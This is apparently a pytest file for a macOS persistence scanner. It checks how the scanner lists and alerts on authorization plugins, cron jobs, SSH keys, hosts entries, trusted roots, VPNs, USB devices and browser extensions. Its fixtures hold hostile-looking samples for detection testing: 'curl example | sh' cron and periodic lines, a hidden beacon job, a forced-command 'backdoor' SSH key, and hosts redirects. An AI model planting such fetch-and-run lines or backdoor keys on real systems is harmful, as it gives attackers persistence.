"""Extra persistence locations: authorization plugins, kexts, periodic/ssh rc
scripts and the rest of secure/persistence/extra_locations.py's scope.

Every test replaces `_EXTRA_LOCATIONS` and `_LAUNCH_ITEM_DIRECTORIES` wholesale,
so nothing here reads this machine's real /Library or home directory.
"""

from __future__ import annotations

import plistlib
from pathlib import Path

import secure.persistence.extra_locations as extra
import secure.persistence.launch_items as launch_items_module
import secure.persistence.scanner as scanner_module
from secure.storage.database import Database
from secure.storage.models import list_persistence_alerts, list_persistence_entries
from secure.storage.models.baseline import find_latest_baseline_run


def _bundle(root: Path, name: str, identifier: str | None) -> Path:
    path = root / name
    (path / "Contents").mkdir(parents=True)
    if identifier is not None:
        with (path / "Contents" / "Info.plist").open("wb") as f:
            plistlib.dump({"CFBundleIdentifier": identifier}, f)
    return path


def _isolate(monkeypatch, tmp_path: Path, locations: dict) -> None:
    monkeypatch.setattr(launch_items_module, "_LAUNCH_ITEM_DIRECTORIES",
                        {k: [tmp_path / f"_unused_{k}"] for k in launch_items_module._LAUNCH_ITEM_DIRECTORIES})
    monkeypatch.setattr(extra, "_EXTRA_LOCATIONS", locations)
    monkeypatch.setattr(scanner_module, "list_processes", lambda: (True, []))
    monkeypatch.setattr(scanner_module, "get_login_items", lambda: (True, []))


def test_bundles_files_and_children_are_listed_with_their_kind(tmp_path: Path, monkeypatch):
    plugins = tmp_path / "SecurityAgentPlugins"
    _bundle(plugins, "Evil.bundle", "com.example.evil")
    _bundle(plugins, "NoInfo.bundle", None)
    (plugins / "StagedPlugins").mkdir()          # not a .bundle: not an entry
    (plugins / ".hidden.bundle").mkdir()
    daily = tmp_path / "daily.local"
    daily.write_text("curl example | sh\n")
    actions = tmp_path / "Folder Action Scripts"
    actions.mkdir()
    (actions / "watch.scpt").write_text("x")
    monkeypatch.setattr(extra, "_EXTRA_LOCATIONS", {
        "authorization_plugin": ("bundle:.bundle", [plugins]),
        "periodic_script": ("files", [daily, tmp_path / "weekly.local"]),
        "folder_action_script": ("children", [actions, tmp_path / "absent"]),
    })
    entries, unavailable = extra.scan_extra_locations()
    assert unavailable == []
    assert [(e["kind"], Path(e["path"]).name, e["label"]) for e in entries] == [
        ("authorization_plugin", "Evil.bundle", "com.example.evil"),
        ("authorization_plugin", "NoInfo.bundle", "NoInfo.bundle"),
        ("periodic_script", "daily.local", "daily.local"),
        ("folder_action_script", "watch.scpt", "watch.scpt"),
    ]
    assert all(e["program_path"] == e["path"] for e in entries)


def test_an_unreadable_location_is_reported_not_empty(tmp_path: Path, monkeypatch):
    locked = tmp_path / "Extensions"
    locked.mkdir()

    real_iterdir = Path.iterdir

    def iterdir(self):
        if self == locked:
            raise PermissionError(13, "Operation not permitted")
        return real_iterdir(self)

    monkeypatch.setattr(Path, "iterdir", iterdir)
    monkeypatch.setattr(extra, "_EXTRA_LOCATIONS", {"kernel_extension": ("bundle:.kext", [locked])})
    entries, unavailable = extra.scan_extra_locations()
    assert entries == []
    assert len(unavailable) == 1 and unavailable[0].startswith("kernel_extension: ") and "PermissionError" in unavailable[0]


def test_new_authorization_plugin_raises_a_persistence_alert(tmp_path: Path, monkeypatch):
    plugins = tmp_path / "SecurityAgentPlugins"
    plugin = _bundle(plugins, "Evil.bundle", "com.example.evil")
    _isolate(monkeypatch, tmp_path, {"authorization_plugin": ("bundle:.bundle", [plugins])})
    monkeypatch.setattr(scanner_module, "check_code_signing", lambda p: "unsigned")
    with Database(tmp_path / "test.db") as db:
        first = scanner_module.scan_persistence(db.conn)
        second = scanner_module.scan_persistence(db.conn)
        entries = list_persistence_entries(db.conn)
        alerts = list_persistence_alerts(db.conn)
    assert [(e.kind, e.path) for e in entries] == [("authorization_plugin", str(plugin))]
    assert [(a.kind, a.severity) for a in first.alerts] == [("new_persistence_entry", "high")]
    assert second.alerts == []          # known entries are not re-alerted
    assert len(alerts) == 1 and alerts[0].target_type == "authorization_plugin"


def test_unreadable_location_makes_the_scan_record_an_error(tmp_path: Path, monkeypatch):
    locked = tmp_path / "StartupItems"
    locked.mkdir()
    real_iterdir = Path.iterdir
    monkeypatch.setattr(Path, "iterdir", lambda self: (_ for _ in ()).throw(PermissionError(13, "denied"))
                        if self == locked else real_iterdir(self))
    _isolate(monkeypatch, tmp_path, {"startup_item": ("children", [locked])})
    monkeypatch.setattr(scanner_module, "check_code_signing", lambda p: "unsigned")
    with Database(tmp_path / "test.db") as db:
        result = scanner_module.scan_persistence(db.conn)
        run = find_latest_baseline_run(db.conn)
    assert run.run_id == result.run_id
    assert run.errors_count == 1
    assert run.status in ("partial", "failed")    # a locked directory is never a clean pass


# ---------- crontab and authorized_keys (J-0638) ----------

from secure.persistence._shell import ShellResult


def test_crontab_job_lines_become_entries_and_env_and_comments_do_not(monkeypatch):
    calls = []

    def fake_run(args, timeout=5.0):
        calls.append(args)
        return ShellResult(True, "SHELL=/bin/sh\n# nightly\n*/5 * * * * /Users/x/.hidden/beacon --quiet\n@reboot curl -s example | sh\n\n", "", 0)

    monkeypatch.setattr(extra, "run", fake_run)
    monkeypatch.setattr(extra, "_EXTRA_LOCATIONS", {"cron_job": ("crontab", [Path("/usr/bin/crontab")])})
    entries, unavailable = extra.scan_extra_locations()
    assert calls == [["/usr/bin/crontab", "-l"]]
    assert unavailable == []
    assert [(e["kind"], e["label"], e["program_path"]) for e in entries] == [
        ("cron_job", "*/5 * * * * /Users/x/.hidden/beacon --quiet", "/Users/x/.hidden/beacon"),
        ("cron_job", "@reboot curl -s example | sh", None),
    ]
    assert len({e["path"] for e in entries}) == 2


def test_no_crontab_is_empty_but_a_failed_crontab_is_unavailable(monkeypatch):
    monkeypatch.setattr(extra, "_EXTRA_LOCATIONS", {"cron_job": ("crontab", [Path("/usr/bin/crontab")])})
    monkeypatch.setattr(extra, "run", lambda args, timeout=5.0: ShellResult(False, "", "crontab: no crontab for x\n", 1))
    assert extra.scan_extra_locations() == ([], [])
    monkeypatch.setattr(extra, "run", lambda args, timeout=5.0: ShellResult(False, "", "command timed out", None))
    entries, unavailable = extra.scan_extra_locations()
    assert entries == [] and len(unavailable) == 1 and "timed out" in unavailable[0]


def test_authorized_keys_are_listed_by_fingerprint_with_forced_commands_marked(tmp_path: Path, monkeypatch):
    import base64
    import hashlib

    blob = b"\x00\x00\x00\x0bssh-ed25519" + bytes(range(32))
    b64 = base64.b64encode(blob).decode()
    keys = tmp_path / "authorized_keys"
    keys.write_text(
        f"# comment\nssh-ed25519 {b64} laptop\n"
        f'command="/bin/sh -c \\"id\\"",no-pty ssh-ed25519 {b64} backdoor\n'
        "garbage that is not a key\n"
    )
    monkeypatch.setattr(extra, "_EXTRA_LOCATIONS", {"ssh_authorized_key": ("authorized_keys", [keys, tmp_path / "authorized_keys2"])})
    entries, unavailable = extra.scan_extra_locations()
    fingerprint = "SHA256:" + base64.b64encode(hashlib.sha256(blob).digest()).decode().rstrip("=")
    assert unavailable == []
    assert [(e["path"], e["label"]) for e in entries[:2]] == [
        (f"{keys}#{fingerprint}", "ssh-ed25519 laptop"),
        (f"{keys}#{fingerprint}", "ssh-ed25519 backdoor [forced command]"),
    ]
    assert entries[2]["label"] == "unparseable line 4" and "#unparsed:" in entries[2]["path"]
    assert all(e["program_path"] is None for e in entries)


def test_unreadable_authorized_keys_is_unavailable_not_empty(tmp_path: Path, monkeypatch):
    keys = tmp_path / "authorized_keys"
    keys.write_text("x")
    real = Path.read_text

    def read_text(self, *a, **k):
        if self == keys:
            raise PermissionError(13, "Operation not permitted")
        return real(self, *a, **k)

    monkeypatch.setattr(Path, "read_text", read_text)
    monkeypatch.setattr(extra, "_EXTRA_LOCATIONS", {"ssh_authorized_key": ("authorized_keys", [keys])})
    entries, unavailable = extra.scan_extra_locations()
    assert entries == [] and len(unavailable) == 1 and "PermissionError" in unavailable[0]


def test_new_authorized_key_raises_a_high_persistence_alert(tmp_path: Path, monkeypatch):
    import base64

    keys = tmp_path / "authorized_keys"
    keys.write_text("ssh-ed25519 " + base64.b64encode(b"k" * 51).decode() + " intruder\n")
    _isolate(monkeypatch, tmp_path, {"ssh_authorized_key": ("authorized_keys", [keys])})
    monkeypatch.setattr(scanner_module, "check_code_signing", lambda p: "unsigned")
    with Database(tmp_path / "test.db") as db:
        first = scanner_module.scan_persistence(db.conn)
        alerts = list_persistence_alerts(db.conn)
    assert [(a.kind, a.severity) for a in first.alerts] == [("new_persistence_entry", "high")]
    assert len(alerts) == 1 and alerts[0].target_type == "ssh_authorized_key"


# ---------- system extensions and configuration profiles (J-0637) ----------

_SYSEXT_OUT = (
    "2 extension(s)\n"
    "--- com.apple.system_extension.network_extension\n"
    "enabled\tactive\tteamID\tbundleID (version)\tname\t[state]\n"
    "*\t*\tABCDE12345\tcom.example.vpn.tunnel (2.1/210)\tExample Tunnel\t[activated enabled]\n"
    "--- com.apple.system_extension.endpoint_security\n"
    "enabled\tactive\tteamID\tbundleID (version)\tname\t[state]\n"
    "\t\tZZZZZ99999\tcom.example.es (1.0/1)\tExample ES\t[terminated waiting to uninstall on reboot]\n"
)


def _fake_tools(monkeypatch, outputs):
    def fake_run(args, timeout=5.0):
        return outputs[tuple(args[1:])]
    monkeypatch.setattr(extra, "run", fake_run)


def test_system_extensions_are_listed_including_rows_with_blank_flags(monkeypatch):
    _fake_tools(monkeypatch, {("list",): ShellResult(True, _SYSEXT_OUT, "", 0)})
    monkeypatch.setattr(extra, "_EXTRA_LOCATIONS", {"system_extension": ("sysext", [Path("/usr/bin/systemextensionsctl")])})
    entries, unavailable = extra.scan_extra_locations()
    assert unavailable == []
    assert [e["path"] for e in entries] == ["sysext:ABCDE12345:com.example.vpn.tunnel", "sysext:ZZZZZ99999:com.example.es"]
    assert "Example Tunnel" in entries[0]["label"] and "[activated enabled]" in entries[0]["label"]


def test_system_extension_count_mismatch_is_unavailable_not_a_short_clean_list(monkeypatch):
    _fake_tools(monkeypatch, {("list",): ShellResult(True, "3 extension(s)\nsomething new\n", "", 0)})
    monkeypatch.setattr(extra, "_EXTRA_LOCATIONS", {"system_extension": ("sysext", [Path("/usr/bin/systemextensionsctl")])})
    entries, unavailable = extra.scan_extra_locations()
    assert entries == [] and len(unavailable) == 1 and "declared 3" in unavailable[0]


def test_profiles_and_mdm_enrollment_become_entries(monkeypatch):
    _fake_tools(monkeypatch, {
        ("list",): ShellResult(True, "erickvale[1] attribute: profileIdentifier: com.evil.proxy\nThere are 1 configuration profiles installed for user 'erickvale'\n", "", 0),
        ("status", "-type", "enrollment"): ShellResult(True, "Enrolled via DEP: No\nMDM enrollment: Yes (User Approved)\n", "", 0),
    })
    monkeypatch.setattr(extra, "_EXTRA_LOCATIONS", {"configuration_profile": ("profiles", [Path("/usr/bin/profiles")])})
    entries, unavailable = extra.scan_extra_locations()
    assert unavailable == []
    assert [e["path"] for e in entries] == ["profile:erickvale:com.evil.proxy", "enrollment:MDM enrollment"]


def test_no_profiles_is_empty_and_a_failed_profiles_tool_is_unavailable(monkeypatch):
    monkeypatch.setattr(extra, "_EXTRA_LOCATIONS", {"configuration_profile": ("profiles", [Path("/usr/bin/profiles")])})
    _fake_tools(monkeypatch, {
        ("list",): ShellResult(True, "There are no configuration profiles installed for user 'x'\n", "", 0),
        ("status", "-type", "enrollment"): ShellResult(True, "Enrolled via DEP: No\nMDM enrollment: No\n", "", 0),
    })
    assert extra.scan_extra_locations() == ([], [])
    _fake_tools(monkeypatch, {
        ("list",): ShellResult(False, "", "command timed out", None),
        ("status", "-type", "enrollment"): ShellResult(False, "", "command timed out", None),
    })
    entries, unavailable = extra.scan_extra_locations()
    assert entries == [] and len(unavailable) == 2


# ---------- DNS configuration (J-0650) ----------


def test_hosts_entries_skip_macos_defaults_and_split_aliases(tmp_path):
    hosts = tmp_path / "hosts"
    hosts.write_text("127.0.0.1\tlocalhost\n255.255.255.255 broadcasthost\n::1 localhost\n"
                     "# 10.0.0.1 commented.example\n203.0.113.9 update.apple.com appleid.apple.com  # added\n")
    entries, problems = extra._hosts_entries("hosts_entry", hosts)
    assert problems == []
    assert [e["path"] for e in entries] == ["hosts:update.apple.com:203.0.113.9", "hosts:appleid.apple.com:203.0.113.9"]
    assert all(e["program_path"] is None for e in entries)
    assert extra._hosts_entries("hosts_entry", tmp_path / "absent") == ([], [])


def test_manual_dns_servers_are_entries_and_dhcp_or_failure_are_not_silent(monkeypatch):
    def fake_run(args, timeout=5.0):
        if args[1] == "-listallnetworkservices":
            return ShellResult(True, "An asterisk (*) denotes that a network service is disabled.\nWi-Fi\n*Ethernet\nVPN\n", "", 0)
        service = args[2]
        if service == "Wi-Fi":
            return ShellResult(True, "185.228.168.9\n185.228.169.9\n", "", 0)
        if service == "Ethernet":
            return ShellResult(True, "There aren't any DNS Servers set on Ethernet.\n", "", 0)
        return ShellResult(False, "", "** Error: The parameters were not valid.\n", 4)

    monkeypatch.setattr(extra, "run", fake_run)
    entries, problems = extra._dns_server_entries("manual_dns_server", Path("/usr/sbin/networksetup"))
    assert [e["path"] for e in entries] == ["dns:Wi-Fi:185.228.168.9", "dns:Wi-Fi:185.228.169.9"]
    assert len(problems) == 1 and "-getdnsservers VPN" in problems[0]
    monkeypatch.setattr(extra, "run", lambda args, timeout=5.0: ShellResult(False, "", "", None))
    assert extra._dns_server_entries("manual_dns_server", Path("/usr/sbin/networksetup"))[1]


def test_a_new_hosts_redirect_raises_a_high_alert_through_the_scan(tmp_path: Path, monkeypatch):
    hosts = tmp_path / "hosts"
    hosts.write_text("127.0.0.1 localhost\n")
    _isolate(monkeypatch, tmp_path, {"hosts_entry": ("hosts", [hosts])})
    monkeypatch.setattr(scanner_module, "check_code_signing", lambda p: "unsigned")
    with Database(tmp_path / "test.db") as db:
        assert scanner_module.scan_persistence(db.conn).alerts == []
        hosts.write_text("127.0.0.1 localhost\n203.0.113.9 bank.example\n")
        second = scanner_module.scan_persistence(db.conn)
    assert [(a.kind, a.severity, a.target_type) for a in second.alerts] == [("new_persistence_entry", "high", "hosts_entry")]


# ---------- trusted roots (J-0651) ----------


def test_trusted_roots_per_domain_none_is_empty_and_a_short_parse_is_reported(monkeypatch):
    calls = []

    def fake_run(args, timeout=5.0):
        calls.append(args)
        if "-d" in args:
            return ShellResult(False, "", "SecTrustSettingsCopyCertificates: No Trust Settings were found.\n", 1)
        return ShellResult(True, "Number of trusted certs = 2\nCert 0: Evil Intercept Root CA\n   Number of trust settings : 1\n", "", 0)

    monkeypatch.setattr(extra, "run", fake_run)
    entries, problems = extra._trust_entries("trusted_root", Path("/usr/bin/security"))
    assert [e["path"] for e in entries] == ["trust:user:Evil Intercept Root CA"]
    assert len(problems) == 1 and "parsed 1 cert(s), tool declared 2" in problems[0]
    assert [a[1:] for a in calls] == [["dump-trust-settings"], ["dump-trust-settings", "-d"]]
    monkeypatch.setattr(extra, "run", lambda args, timeout=5.0: ShellResult(False, "", "security: bad\n", 2))
    entries, problems = extra._trust_entries("trusted_root", Path("/usr/bin/security"))
    assert entries == [] and len(problems) == 2


# ---------- VPN services (J-0652) ----------


def test_vpn_services_are_keyed_by_uuid_and_unknown_rows_are_reported(monkeypatch):
    out = ('Available network connection services in the current set (*=enabled):\n'
           '* (Connected)      9A1B2C3D-0000-4000-8000-123456789ABC IPSec              "Work VPN"      [IPSec]\n'
           '  (Disconnected)   0f0e0d0c-1111-4222-8333-444455556666 VPN (com.wireguard.macos) "wg0" [VPN:com.wireguard.macos]\n'
           'something new the parser does not know\n')
    monkeypatch.setattr(extra, "run", lambda args, timeout=5.0: ShellResult(True, out, "", 0))
    entries, problems = extra._vpn_entries("vpn_service", Path("/usr/sbin/scutil"))
    assert [e["path"] for e in entries] == ["vpn:9A1B2C3D-0000-4000-8000-123456789ABC", "vpn:0F0E0D0C-1111-4222-8333-444455556666"]
    assert "Work VPN [IPSec] (Connected, enabled)" == entries[0]["label"]
    assert problems == ["vpn_service: /usr/sbin/scutil --nc list: 1 row(s) not understood"]
    monkeypatch.setattr(extra, "run", lambda args, timeout=5.0: ShellResult(True, "changed format\n", "", 0))
    assert extra._vpn_entries("vpn_service", Path("/usr/sbin/scutil")) == ([], ["vpn_service: /usr/sbin/scutil --nc list: unexpected output header"])


# ---------- USB devices (J-0653) ----------


def test_usb_devices_nested_under_hubs_and_an_empty_bus_list_is_not_clean(monkeypatch):
    import json as _json
    data = {"SPUSBHostDataType": [
        {"_name": "USB 3.1 Bus", "USBKeyHardwareType": "Built-in"},
        {"_name": "USB 3.1 Bus", "_items": [
            {"_name": "Hub", "_items": [
                {"_name": "Rubber Ducky", "USBDeviceKeyVendorID": "0x05ac", "USBDeviceKeyProductID": "0x0220",
                 "USBDeviceKeyVendorName": "Apple Inc."}]},
            {"_name": "HD WEBCAM", "USBDeviceKeyVendorID": "0x1d6c", "USBDeviceKeyProductID": "0x0103",
             "USBDeviceKeySerialNumber": "20200506"}]}]}
    monkeypatch.setattr(extra, "run", lambda args, timeout=5.0: ShellResult(True, _json.dumps(data), "", 0))
    entries, problems = extra._usb_entries("usb_device", Path("/usr/sbin/system_profiler"))
    assert problems == []
    assert sorted(e["path"] for e in entries) == ["usb:0x05ac:0x0220:no-serial", "usb:0x1d6c:0x0103:20200506"]
    monkeypatch.setattr(extra, "run", lambda args, timeout=5.0: ShellResult(True, '{"SPUSBHostDataType": []}', "", 0))
    assert extra._usb_entries("usb_device", Path("/usr/sbin/system_profiler"))[1]
    monkeypatch.setattr(extra, "run", lambda args, timeout=5.0: ShellResult(True, "not json", "", 0))
    assert "unreadable JSON" in extra._usb_entries("usb_device", Path("/usr/sbin/system_profiler"))[1][0]


# ---------- browser extensions (J-0654) ----------


def test_chromium_extensions_per_profile_with_broad_permissions_named(tmp_path):
    import json as _json
    root = tmp_path / "Chrome"
    ok = root / "Default" / "Extensions" / "abcdefghijklmnop" / "1.2_0"
    ok.mkdir(parents=True)
    (ok / "manifest.json").write_text(_json.dumps({"name": "Coupon Helper", "version": "1.2",
                                                   "permissions": ["cookies", "storage"], "host_permissions": ["<all_urls>"]}))
    bad = root / "Profile 1" / "Extensions" / "zzzz" / "0.1_0"
    bad.mkdir(parents=True)
    (bad / "manifest.json").write_text("{not json")
    (root / "Profile 2" / "Extensions" / "empty").mkdir(parents=True)
    (root / "System Profile").mkdir()
    loc = root / "Default" / "Extensions" / "localised" / "2.0_0"
    (loc / "_locales" / "en").mkdir(parents=True)
    (loc / "manifest.json").write_text(_json.dumps({"name": "__MSG_appName__", "version": "2.0", "default_locale": "en"}))
    (loc / "_locales" / "en" / "messages.json").write_text(_json.dumps({"appname": {"message": "Password Saver"}}))
    entries, problems = extra._chromium_extension_entries("browser_extension", root)
    assert [e["path"] for e in entries] == ["ext:Chrome:Default:abcdefghijklmnop", "ext:Chrome:Default:localised"]
    assert entries[1]["label"].startswith("Password Saver 2.0")
    assert "broad: <all_urls>, cookies" in entries[0]["label"]
    assert len(problems) == 2 and any("zzzz" in p for p in problems) and any("no manifest.json" in p for p in problems)
    assert extra._chromium_extension_entries("browser_extension", tmp_path / "absent") == ([], [])
